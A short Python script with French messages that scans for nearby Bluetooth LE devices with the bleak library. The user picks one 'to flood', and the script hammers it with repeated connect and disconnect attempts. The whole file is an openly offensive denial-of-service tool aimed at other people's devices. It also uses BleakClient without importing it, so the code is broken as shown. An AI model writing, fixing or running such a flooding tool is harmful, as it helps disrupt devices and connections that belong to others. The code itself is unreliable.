import asyncio
from bleak import BleakScanner

async def scan_bluetooth_devices():
    devices = await BleakScanner.discover()
    for idx, device in enumerate(devices):
        print(f"[{idx}] Adresse MAC: {device.address}, Nom: {device.name}, RSSI: {device.rssi}")
    return devices    

async def flood_bluetooth_device(address, num_pings=100):
    async with BleakClient(address) as client:
        for i in range(num_pings):
            try:
                print(f"Ping {i+1}/{num_pings} envoyé à {address}")
                await client.connect()
                await asyncio.sleep(0.1)
            except Exception as e:
                print(f"Erreur lors du ping : {e}")
            finally:
                await client.disconnect()

async def disconnect_device(address):
    async with BleakClient(address) as client:
        try:
            await client.disconnect()
            print(f"Déconnexion de l'appareil {address} réussie.")
        except Exception as e:
            print(f"Erreur lors de la déconnexion : {e}")

async def main():
    devices = await scan_bluetooth_devices()

    index = int(input("Choisir le numéro de l'appareil à flooder : "))
    device_address = devices[index].address
    num_pings = int(input("Combien de pings voulez-vous envoyer? "))

    await flood_bluetooth_device(device_address, num_pings)
    await disconnect_device(device_address)


if __name__ == "__main__":
    asyncio.run(main())